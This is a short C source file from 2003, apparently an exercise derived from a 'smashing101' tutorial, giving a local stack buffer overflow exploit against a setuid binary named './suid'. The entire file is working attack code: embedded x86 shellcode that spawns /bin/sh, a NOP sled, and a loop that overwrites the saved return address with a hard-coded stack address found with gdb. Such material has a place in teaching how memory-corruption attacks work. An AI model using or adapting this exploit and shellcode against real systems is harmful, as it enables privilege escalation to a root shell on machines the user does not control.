/* 
	(Possibly) The shortest local stack buffer overflow exploit 
	technique using exact offsets.

	Derived from smashing101.tgz
	
	By j00n1x (c) 2003
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

char shellcode[] = \
	"\x83\xc4\x14\x6a\xb\x58\x99\x52\x68\x6e\x2f\x73" \
	"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1" \
	"\xcd\x80";

// This is the size of the target buffer after alignment
#define BUFFERSIZE 256

// This is the number of times we need to overwrite with our return address
// to hope to hit the saved EIP -- if this is large enough, it compensates
// for any gcc buffer allocation oddities.
#define HOMERUN 64

int main()
{

	int i;
	char buf[HOMERUN * sizeof(int) + BUFFERSIZE];
	unsigned int base_address;

//	base_address = 0xdeadbeef; // 1st step (offset crashes program)
	base_address = 0xbffff8f0; // 2nd step (offset of esp from gdb core w/ "info reg")

	memset(buf, 0x90, sizeof(buf));
	memcpy(buf + BUFFERSIZE - strlen(shellcode), shellcode, 
		strlen(shellcode));

	// smash over the saved eip

	for (i = 0; i < HOMERUN; i++) { 
		*(int *) (buf + BUFFERSIZE + i * sizeof(int)) = 
			base_address - BUFFERSIZE;
	}

	execl("./suid", "./suid", buf, NULL);
}
